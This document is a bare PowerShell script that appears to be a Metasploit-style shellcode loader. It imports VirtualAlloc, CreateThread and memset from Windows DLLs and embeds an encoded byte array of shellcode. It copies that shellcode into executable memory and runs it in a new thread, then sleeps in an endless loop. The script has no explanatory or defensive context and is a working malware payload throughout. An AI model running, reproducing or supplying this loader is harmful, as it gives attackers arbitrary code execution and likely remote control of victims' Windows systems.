$ZgOB = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ZgOB -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc2,0xd9,0x74,0x24,0xf4,0xba,0xed,0x38,0x19,0x1d,0x5b,0x2b,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x53,0x14,0x03,0x53,0xf9,0xda,0xec,0xe1,0xe9,0x99,0x0f,0x1a,0xe9,0xfd,0x86,0xff,0xd8,0x3d,0xfc,0x74,0x4a,0x8e,0x76,0xd8,0x66,0x65,0xda,0xc9,0xfd,0x0b,0xf3,0xfe,0xb6,0xa6,0x25,0x30,0x47,0x9a,0x16,0x53,0xcb,0xe1,0x4a,0xb3,0xf2,0x29,0x9f,0xb2,0x33,0x57,0x52,0xe6,0xec,0x13,0xc1,0x17,0x99,0x6e,0xda,0x9c,0xd1,0x7f,0x5a,0x40,0xa1,0x7e,0x4b,0xd7,0xba,0xd8,0x4b,0xd9,0x6f,0x51,0xc2,0xc1,0x6c,0x5c,0x9c,0x7a,0x46,0x2a,0x1f,0xab,0x97,0xd3,0x8c,0x92,0x18,0x26,0xcc,0xd3,0x9e,0xd9,0xbb,0x2d,0xdd,0x64,0xbc,0xe9,0x9c,0xb2,0x49,0xea,0x06,0x30,0xe9,0xd6,0xb7,0x95,0x6c,0x9c,0xbb,0x52,0xfa,0xfa,0xdf,0x65,0x2f,0x71,0xdb,0xee,0xce,0x56,0x6a,0xb4,0xf4,0x72,0x37,0x6e,0x94,0x23,0x9d,0xc1,0xa9,0x34,0x7e,0xbd,0x0f,0x3e,0x92,0xaa,0x3d,0x1d,0xfa,0x1f,0x0c,0x9e,0xfa,0x37,0x07,0xed,0xc8,0x98,0xb3,0x79,0x60,0x50,0x1a,0x7d,0x87,0x4b,0xda,0x11,0x76,0x74,0x1b,0x3b,0xbc,0x20,0x4b,0x53,0x15,0x49,0x00,0xa3,0x9a,0x9c,0xbd,0xa6,0x0c,0xdf,0xea,0xa8,0x1d,0xb7,0xe8,0xaa,0x9f,0xd2,0x64,0x4c,0xcf,0xb2,0x26,0xc1,0xaf,0x62,0x87,0xb1,0x47,0x69,0x08,0xed,0x77,0x92,0xc2,0x86,0x1d,0x7d,0xbb,0xff,0x89,0xe4,0xe6,0x74,0x28,0xe8,0x3c,0xf1,0x6a,0x62,0xb3,0x05,0x24,0x83,0xbe,0x15,0xd0,0x63,0xf5,0x44,0x76,0x7b,0x23,0xe2,0x76,0xe9,0xc8,0xa5,0x21,0x85,0xd2,0x90,0x05,0x0a,0x2c,0xf7,0x1e,0x83,0xb8,0xb8,0x48,0xec,0x2c,0x39,0x88,0xba,0x26,0x39,0xe0,0x1a,0x13,0x6a,0x15,0x65,0x8e,0x1e,0x86,0xf0,0x31,0x77,0x7b,0x52,0x5a,0x75,0xa2,0x94,0xc5,0x86,0x81,0x24,0x39,0x51,0xef,0x52,0x53,0x61;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$w57T=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($w57T.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$w57T,0,0,0);for (;;){Start-sleep 60};